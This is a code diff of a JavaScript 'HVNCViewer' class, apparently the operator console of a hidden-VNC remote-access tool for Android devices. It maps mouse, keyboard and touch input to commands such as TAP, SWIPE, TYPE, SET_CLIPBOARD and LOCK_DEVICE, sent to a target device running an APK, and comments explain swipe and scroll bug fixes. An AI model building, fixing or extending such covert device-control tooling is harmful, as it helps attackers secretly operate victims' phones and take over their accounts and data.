-    if (!this._ripples.length) return;
-    const now      = performance.now();
-    const DURATION = 450;
-    const dpr      = this._dpr;
-    this._ripples  = this._ripples.filter(r => now - r.t < DURATION);
-
-    for (const r of this._ripples) {
-      const p      = (now - r.t) / DURATION;
-      const radius = p * 44 * dpr;
-      const alpha  = (1 - p) * 0.75;
-      this.ctx.save();
-      this.ctx.beginPath();
-      this.ctx.arc(r.x, r.y, radius, 0, Math.PI * 2);
-      this.ctx.strokeStyle = r.type === 'long'
-        ? `rgba(224,168,74,${alpha})`
-        : `rgba(74,168,255,${alpha})`;
-      this.ctx.lineWidth = 2.5 * dpr;
-      this.ctx.stroke();
-      // inner ring
-      this.ctx.beginPath();
-      this.ctx.arc(r.x, r.y, radius * 0.4, 0, Math.PI * 2);
-      this.ctx.strokeStyle = r.type === 'long'
-        ? `rgba(224,168,74,${alpha * 0.5})`
-        : `rgba(74,168,255,${alpha * 0.5})`;
-      this.ctx.lineWidth = dpr;
-      this.ctx.stroke();
-      this.ctx.restore();
-    }
   }
 
   _drawCursor() {
     const { x, y } = this._cursor;
-    const dpr = this._dpr;
-    const cx  = x * this.canvas.width;
-    const cy  = y * this.canvas.height;
-    const c   = this.ctx;
+    const cx = x * this.canvas.width;
+    const cy = y * this.canvas.height;
+    const c  = this.ctx;
     c.save();
+    // Outer crosshair
     c.strokeStyle = 'rgba(255,60,60,0.85)';
-    c.lineWidth   = 1.5 * dpr;
+    c.lineWidth   = 1.5;
     c.beginPath();
-    c.moveTo(cx - 11 * dpr, cy); c.lineTo(cx - 4 * dpr, cy);
-    c.moveTo(cx + 4 * dpr,  cy); c.lineTo(cx + 11 * dpr, cy);
-    c.moveTo(cx, cy - 11 * dpr); c.lineTo(cx, cy - 4 * dpr);
-    c.moveTo(cx, cy + 4 * dpr);  c.lineTo(cx, cy + 11 * dpr);
+    c.moveTo(cx - 11, cy); c.lineTo(cx - 4, cy);
+    c.moveTo(cx + 4,  cy); c.lineTo(cx + 11, cy);
+    c.moveTo(cx, cy - 11); c.lineTo(cx, cy - 4);
+    c.moveTo(cx, cy + 4);  c.lineTo(cx, cy + 11);
     c.stroke();
+    // Inner dot ring
     c.beginPath();
-    c.arc(cx, cy, 3 * dpr, 0, Math.PI * 2);
+    c.arc(cx, cy, 3, 0, Math.PI * 2);
     c.strokeStyle = 'rgba(255,100,100,0.7)';
-    c.lineWidth   = dpr;
+    c.lineWidth   = 1;
     c.stroke();
+    // Flash when mouse down
     if (this._mouse.down) {
       c.beginPath();
-      c.arc(cx, cy, 10 * dpr, 0, Math.PI * 2);
+      c.arc(cx, cy, 10, 0, Math.PI * 2);
       c.strokeStyle = 'rgba(255,80,80,0.5)';
-      c.lineWidth   = 1.5 * dpr;
+      c.lineWidth   = 1.5;
       c.stroke();
     }
     c.restore();
@@ -867,25 +633,24 @@ class HVNCViewer {
     const c = this.ctx;
     const w = this.canvas.width;
     const h = this.canvas.height;
-    const d = this._dpr;
     c.fillStyle = '#06060f';
     c.fillRect(0, 0, w, h);
     c.strokeStyle = '#1e1e38';
-    c.lineWidth   = 1.5 * d;
+    c.lineWidth = 1.5;
     c.beginPath();
     if (c.roundRect) {
-      c.roundRect(w / 2 - 80 * d, h / 2 - 140 * d, 160 * d, 280 * d, 14 * d);
+      c.roundRect(w / 2 - 80, h / 2 - 140, 160, 280, 14);
     } else {
-      c.rect(w / 2 - 80 * d, h / 2 - 140 * d, 160 * d, 280 * d);
+      c.rect(w / 2 - 80, h / 2 - 140, 160, 280);
     }
     c.stroke();
     c.fillStyle = '#2a2a4a';
-    c.font      = `bold ${12 * d}px monospace`;
+    c.font = 'bold 12px monospace';
     c.textAlign = 'center';
-    c.fillText('Press ▶ START', w / 2, h / 2 + 10 * d);
-    c.font      = `${10 * d}px monospace`;
+    c.fillText('Press ▶ START', w / 2, h / 2 + 10);
+    c.font = '10px monospace';
     c.fillStyle = '#1e1e32';
-    c.fillText(`Mode: ${this._mode.toUpperCase()}`, w / 2, h / 2 + 28 * d);
+    c.fillText(`Mode: ${this._mode.toUpperCase()}`, w / 2, h / 2 + 28);
     c.textAlign = 'left';
   }
 
@@ -919,9 +684,7 @@ class HVNCViewer {
     if (lb) lb.textContent = this._quality + '%';
   }
 
-  // ── Coordinate mapping ─────────────────────────────────────────────────────
-  // getBoundingClientRect is post-transform — accounts for both zoom (CSS scale)
-  // and pan (CSS translate) automatically. No adjustments needed.
+  // ── Coordinate mapping ────────────────────────────────────────────────────
   _mapCoords(clientX, clientY) {
     const r  = this.canvas.getBoundingClientRect();
     const sx = (this.frameW / r.width)  / this._zoom;
@@ -937,101 +700,59 @@ class HVNCViewer {
     this._send({ type: 'cmd', target: this.deviceId, cmd, args });
   }
 
-  _sendOp(obj) { this._send(obj); }
+  _sendOp(obj) {
+    this._send(obj);
+  }
 
   // ── Input ──────────────────────────────────────────────────────────────────
   _bindInput() {
     const c = this.canvas;
+
+    // [Bug 4 FIX] SWIPE_THRESHOLD changed from 14 to 0.03 (normalized).
+    // _mapCoords returns values clamped to [0.0, 1.0]. The max possible
+    // Math.hypot(dx, dy) across the full canvas is √2 ≈ 1.414.
+    // The original threshold of 14 is always > 1.414, so the else branch
+    // (SWIPE) was unreachable — every interaction became TAP or LONG_PRESS.
+    // 0.03 = 3% of screen dimension, which correctly distinguishes intentional
+    // drags from tap jitter.
     const SWIPE_THRESHOLD = 0.03;
 
-    // Cursor tracking
+    // Live cursor tracking — position shown as red crosshair overlay
     this._cursor     = null;
     this._cursorDown = false;
-
     c.addEventListener('mousemove', e => {
-      // Pan mode (Shift+drag or middle-drag)
-      if (this._panning && this._panOrigin) {
-        this._panX = this._panOriginPan.x + (e.clientX - this._panOrigin.x);
-        this._panY = this._panOriginPan.y + (e.clientY - this._panOrigin.y);
-        this._applyZoom();
-        return;
-      }
-
       this._cursor = this._mapCoords(e.clientX, e.clientY);
-
-      // Hold-scroll — continuous SWIPE at 80ms throttle while mouse held
-      if (this._mouse.down) {
-        const now = performance.now();
-        if (now - this._mouse.lastScrollTime > 80) {
-          const from = this._mouse.lastScrollPos || this._mouse.origin;
-          const pos  = this._cursor;
-          if (Math.hypot(pos.x - from.x, pos.y - from.y) > 0.005) {
-            this._cmd('SWIPE', {
-              x1: from.x, y1: from.y,
-              x2: pos.x,  y2: pos.y,
-              duration: 80,
-            });
-            this._mouse.lastScrollPos   = { ...pos };
-            this._mouse.lastScrollTime  = now;
-            this._mouse.holdScrollFired = true;
-          }
-        }
-      }
     });
-
     c.addEventListener('mouseleave', () => {
       this._cursor = null;
-      if (this._panning) this._panning = false;
     });
 
     c.addEventListener('contextmenu', e => {
       e.preventDefault();
       const pos = this._mapCoords(e.clientX, e.clientY);
       this._cmd('LONG_PRESS', { x: pos.x, y: pos.y });
-      this._spawnRipple(pos.x, pos.y, 'long');
     });
 
     c.addEventListener('mousedown', e => {
-      e.preventDefault();
-      // Middle-click or Shift+click → pan
-      if (e.button === 1 || (e.button === 0 && e.shiftKey)) {
-        this._panning        = true;
-        this._panOrigin      = { x: e.clientX, y: e.clientY };
-        this._panOriginPan   = { x: this._panX, y: this._panY };
-        return;
-      }
       if (e.button !== 0) return;
-      this._mouse.down            = true;
-      this._mouse.origin          = this._mapCoords(e.clientX, e.clientY);
-      this._mouse.t               = performance.now();
-      this._mouse.holdScrollFired = false;
-      this._mouse.lastScrollPos   = null;
-      this._mouse.lastScrollTime  = 0;
+      this._mouse.down   = true;
+      this._mouse.origin = this._mapCoords(e.clientX, e.clientY);
+      this._mouse.t      = performance.now();
       c.focus();
     });
 
     c.addEventListener('mouseup', e => {
-      if (e.button === 1) { this._panning = false; return; }
-      if (this._panning)  { this._panning = false; return; }
       if (!this._mouse.down) return;
       this._mouse.down = false;
-
-      // If hold-scroll fired, suppress final gesture dispatch
-      if (this._mouse.holdScrollFired) {
-        this._mouse.holdScrollFired = false;
-        return;
-      }
-
       const up  = this._mapCoords(e.clientX, e.clientY);
       const dur = performance.now() - this._mouse.t;
       const dx  = up.x - this._mouse.origin.x;
       const dy  = up.y - this._mouse.origin.y;
 
+      // [Bug 4 FIX] Was: Math.hypot(dx, dy) < 14  (always true, SWIPE unreachable)
       if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
-        const type = dur < 500 ? 'TAP' : 'LONG_PRESS';
-        this._cmd(type, { x: this._mouse.origin.x, y: this._mouse.origin.y });
-        this._spawnRipple(this._mouse.origin.x, this._mouse.origin.y,
-          type === 'LONG_PRESS' ? 'long' : 'tap');
+        this._cmd(dur < 500 ? 'TAP' : 'LONG_PRESS',
+          { x: this._mouse.origin.x, y: this._mouse.origin.y });
       } else {
         this._cmd('SWIPE', {
           x1: this._mouse.origin.x, y1: this._mouse.origin.y,
@@ -1046,15 +767,21 @@ class HVNCViewer {
     c.addEventListener('wheel', e => {
       e.preventDefault();
       if (e.ctrlKey || e.metaKey) {
-        this._zoom = Math.max(0.5, Math.min(4, this._zoom * (e.deltaY < 0 ? 1.1 : 0.9)));
+        this._zoom = Math.max(0.5, Math.min(3, this._zoom * (e.deltaY < 0 ? 1.1 : 0.9)));
         this._applyZoom();
         const sl = this.container.querySelector('#_hv_zoom');
         const lb = this.container.querySelector('#_hv_zl');
-        if (sl) sl.value = Math.min(400, Math.round(this._zoom * 100));
+        if (sl) sl.value = Math.round(this._zoom * 100);
         if (lb) lb.textContent = Math.round(this._zoom * 100) + '%';
         return;
       }
-      const pos   = this._mapCoords(e.clientX, e.clientY);
+      const pos = this._mapCoords(e.clientX, e.clientY);
+
+      // [Bug 5 FIX] Was: delta = e.deltaY > 0 ? 400 : -400, then y2: pos.y - delta
+      // pos.y is normalized [0,1]. Subtracting ±400 produced values like -399.5
+      // which the APK auto-detected as pixel-scale, multiplied by screen height,
+      // and got -383,520px — an impossible coordinate that GestureDescription rejected.
+      // Fix: use normalized delta ±0.25 (25% of screen height) clamped to [0.01, 0.99].
       const delta = e.deltaY > 0 ? 0.25 : -0.25;
       this._cmd('SWIPE', {
         x1: pos.x, y1: pos.y,
@@ -1065,29 +792,21 @@ class HVNCViewer {
 
     c.addEventListener('keydown', e => {
       e.preventDefault();
-
-      // Shortcut legend toggle
-      if (e.key === '?') { this._toggleShortcuts(); return; }
-
       if (e.ctrlKey || e.metaKey) {
         switch (e.key.toLowerCase()) {
-          case 'h': this._cmd('HOME',    {}); return;
-          case 'b': this._cmd('BACK',    {}); return;
+          case 'h': this._cmd('HOME', {});    return;
+          case 'b': this._cmd('BACK', {});    return;
           case 'r': this._cmd('RECENTS', {}); return;
           case 'v':
             navigator.clipboard.readText().then(text => {
-              if (text) {
-                this._cmd('SET_CLIPBOARD', { text });
-                setTimeout(() => this._cmd('TYPE', { text }), 100);
-              }
+              if (text) { this._cmd('SET_CLIPBOARD', { text }); setTimeout(() => this._cmd('TYPE', { text }), 100); }
             }).catch(() => {});
             return;
           case 'c': this._cmd('LOCK_DEVICE', {}); return;
-          case 's': this.start(); return;
-          case 'q': this.stop();  return;
+          case 's': this.start();  return;
+          case 'q': this.stop();   return;
         }
       }
-
       switch (e.key) {
         case 'Escape':    this._cmd('BACK',           {}); return;
         case 'F1':        this._cmd('HOME',           {}); return;
@@ -1105,32 +824,28 @@ class HVNCViewer {
         case 'ArrowLeft':
           this._cmd('SWIPE', { x1: .75, y1: .5, x2: .2, y2: .5,  duration: 200 }); return;
         case 'ArrowRight':
-          this._cmd('SWIPE', { x1: .2,  y1: .5, x2: .75, y2: .5, duration: 200 }); return;
+          this._cmd('SWIPE', { x1: .2, y1: .5,  x2: .75, y2: .5, duration: 200 }); return;
       }
-
       if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
         this._cmd('TYPE', { text: e.key });
       }
     });
 
-    // Touch (tablet / mobile operators)
+    // Touch (tablet operators)
     c.addEventListener('touchstart', e => {
       e.preventDefault();
       if (e.touches.length === 2) {
         this._pinch.active = true;
-        this._pinch.dist   = Math.hypot(
+        this._pinch.dist = Math.hypot(
           e.touches[0].clientX - e.touches[1].clientX,
           e.touches[0].clientY - e.touches[1].clientY
         );
         return;
       }
       const t = e.touches[0];
-      this._mouse.down            = true;
-      this._mouse.origin          = this._mapCoords(t.clientX, t.clientY);
-      this._mouse.t               = performance.now();
-      this._mouse.holdScrollFired = false;
-      this._mouse.lastScrollPos   = null;
-      this._mouse.lastScrollTime  = 0;
+      this._mouse.down   = true;
+      this._mouse.origin = this._mapCoords(t.clientX, t.clientY);
+      this._mouse.t      = performance.now();
       c.focus();
     }, { passive: false });
 
@@ -1141,13 +856,9 @@ class HVNCViewer {
           e.touches[0].clientX - e.touches[1].clientX,
           e.touches[0].clientY - e.touches[1].clientY
         );
-        this._zoom = Math.max(0.5, Math.min(4, this._zoom * (nd / this._pinch.dist)));
+        this._zoom = Math.max(0.5, Math.min(3, this._zoom * (nd / this._pinch.dist)));
         this._pinch.dist = nd;
         this._applyZoom();
-        const sl = this.container.querySelector('#_hv_zoom');
-        const lb = this.container.querySelector('#_hv_zl');
-        if (sl) sl.value = Math.min(400, Math.round(this._zoom * 100));
-        if (lb) lb.textContent = Math.round(this._zoom * 100) + '%';
       }
     }, { passive: false });
 
@@ -1156,35 +867,33 @@ class HVNCViewer {
       this._pinch.active = false;
       if (!this._mouse.down) return;
       this._mouse.down = false;
-
-      if (this._mouse.holdScrollFired) { this._mouse.holdScrollFired = false; return; }
-
       const t   = e.changedTouches[0];
       const up  = this._mapCoords(t.clientX, t.clientY);
       const dur = performance.now() - this._mouse.t;
       const dx  = up.x - this._mouse.origin.x;
       const dy  = up.y - this._mouse.origin.y;
 
+      // [Bug 4 FIX] Same threshold fix applied to touchend handler.
+      // Was: Math.hypot(dx, dy) < 14 — always true, SWIPE unreachable from touch input.
       if (Math.hypot(dx, dy) < SWIPE_THRESHOLD && dur < 500) {
         this._cmd('TAP', { x: this._mouse.origin.x, y: this._mouse.origin.y });
-        this._spawnRipple(this._mouse.origin.x, this._mouse.origin.y, 'tap');
       } else if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
         this._cmd('LONG_PRESS', { x: this._mouse.origin.x, y: this._mouse.origin.y });
-        this._spawnRipple(this._mouse.origin.x, this._mouse.origin.y, 'long');
       } else {
         this._cmd('SWIPE', {
           x1: this._mouse.origin.x, y1: this._mouse.origin.y,
-          x2: up.x, y2: up.y,
-          duration: Math.max(80, Math.round(dur)),
+          x2: up.x, y2: up.y, duration: Math.max(80, Math.round(dur)),
         });
       }
     }, { passive: false });
   }
 
-  // ── LyReader passthrough ───────────────────────────────────────────────────
+  // ── Cleanup ────────────────────────────────────────────────────────────────
+  // ── Called by dash.js when a screen_hierarchy WS event arrives ─────────────
   onHierarchy(data) {
     if (this._mode !== 'radar') return;
     if (!this._lyReader) {
+      // Lazy-init: create reader now if panel already visible
       const radarPanel = this.container.querySelector('#_hv_radarpanel');
       if (radarPanel && typeof LyReader !== 'undefined') {
         this._lyReader = new LyReader(
@@ -1197,20 +906,18 @@ class HVNCViewer {
     if (this._lyReader) this._lyReader.update(data);
   }
 
+  // ── Called if container resizes ─────────────────────────────────────────────
   onResize() {
     if (this._lyReader) this._lyReader.onResize();
   }
 
-  // ── Cleanup ────────────────────────────────────────────────────────────────
   destroy() {
     this.stop();
     if (this._lyReader) { this._lyReader.destroy(); this._lyReader = null; }
-    if (this._recorder && this._recActive) { this._recorder.stop(); }
     cancelAnimationFrame(this._rafId);
     clearInterval(this._qaTimer);
     clearInterval(this._sparkTimer);
-    this._stopStallMonitor();
     if (this._pending) { this._pending.close(); this._pending = null; }
-    this._pool.terminate();
+    releaseWorker();
   }
 }
